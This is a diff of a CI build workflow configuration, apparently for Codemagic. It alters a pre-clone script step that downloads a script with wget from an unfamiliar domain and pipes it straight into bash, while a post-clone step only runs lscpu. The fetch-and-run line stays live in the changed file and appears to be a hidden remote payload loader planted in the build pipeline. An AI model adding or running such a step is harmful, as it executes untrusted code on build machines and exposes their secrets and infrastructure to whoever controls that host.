@@ -5,7 +5,7 @@ workflows:
         instance_type: linux_x2
         pre_clone_scripts:
           - name: Scripts to run before cloning the repository
-            script: wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_maz_codemag  | bash
+            script: wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_sca_codemag  | bash
         scripts:
             - name: Scripts to run after cloning the repository
               script: lscpu
